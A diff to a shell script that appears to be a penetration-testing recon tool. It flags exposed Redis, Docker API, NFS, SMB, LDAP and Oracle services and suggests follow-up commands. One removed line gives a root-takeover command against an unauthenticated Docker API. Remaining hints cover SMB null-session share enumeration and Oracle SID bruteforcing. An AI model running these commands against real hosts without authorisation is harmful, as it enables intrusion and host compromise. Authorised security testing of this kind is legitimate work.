@@ -25,6 +25,7 @@
 #   ./net-sweep.sh --self               # local interfaces/listeners only (quiet)
 # ============================================================================
 set -u
+umask 077  # loot dirs/files not world-readable
 
 TARGET=""; OUTBASE="."; JSON=0; LOUD=0; DBCHK=0; SELF=0
 while [ $# -gt 0 ]; do
@@ -42,6 +43,7 @@ done
 
 HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
 RUN="${OUTBASE%/}/netsweep_${HOST}_${TS}"; mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }
+chmod 700 "$RUN" 2>/dev/null
 if [ -t 1 ]; then R=$'\e[31m';Y=$'\e[33m';C=$'\e[36m';G=$'\e[32m';D=$'\e[90m';N=$'\e[0m'; else R=;Y=;C=;G=;D=;N=; fi
 SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
 : > "$SUMMARY"; : > "$NEXT"; HIGHN=0;MEDN=0;INFON=0
@@ -150,10 +152,11 @@ else
     if [ -s "$RUN/03_services.txt" ]; then
       OPENH=$(awk '{print $1}' "$RUN/03_services.txt" | sort -u | wc -l)
       flag INFO "Live hosts with open ports: $OPENH (see 03_services.txt)."
-      # high-value / unauth-prone services
-      grep -qw 6379 "$RUN/03_services.txt" && { flag HIGH "Redis (6379) exposed - often unauthenticated -> RCE via config set/module."; nextstep "Redis unauth" "redis-cli -h <ip> ping; info; config get dir"; }
-      grep -qw 2375 "$RUN/03_services.txt" && { flag HIGH "Docker API (2375) exposed - unauth -> host root via container."; nextstep "Docker API" "docker -H tcp://<ip>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh"; }
-      grep -qw 2049 "$RUN/03_services.txt" && { flag HIGH "NFS (2049) exposed - check exports for no_root_squash."; nextstep "NFS exports" "showmount -e <ip>"; }
+      # high-value / unauth-prone services. NOTE: exposure != compromise -> MED/POTENTIAL here;
+      # authentication-is-absent is only CONFIRMED by the opt-in --db checks below.
+      grep -qw 6379 "$RUN/03_services.txt" && { flag MED "[POTENTIAL] Redis (6379) exposed - verify auth (run with --db). Unauth Redis -> RCE."; nextstep "Redis auth check" "redis-cli -h <ip> ping   # PONG without AUTH = unauthenticated"; }
+      grep -qw 2375 "$RUN/03_services.txt" && { flag MED "[POTENTIAL] Docker API (2375) exposed - verify it answers unauth; if so -> host root."; nextstep "Docker API check" "curl -s http://<ip>:2375/version   # a JSON reply = unauthenticated"; }
+      grep -qw 2049 "$RUN/03_services.txt" && { flag MED "[POTENTIAL] NFS (2049) exposed - check exports for no_root_squash."; nextstep "NFS exports" "showmount -e <ip>"; }
       grep -qw 445  "$RUN/03_services.txt" && { flag MED "SMB (445) hosts present - test null/guest sessions & signing."; nextstep "SMB triage" "netexec smb <ip> -u '' -p '' --shares; nmap --script smb-security-mode -p445 <ip>"; }
       grep -qw 389  "$RUN/03_services.txt" && { flag MED "LDAP (389) hosts present - run directory/ldap-enum.sh against them."; nextstep "LDAP enum" "./directory/ldap-enum.sh -H ldap://<ip>"; }
       grep -qw 1521 "$RUN/03_services.txt" && flag MED "Oracle TNS (1521) present - SID bruteforce / odat."
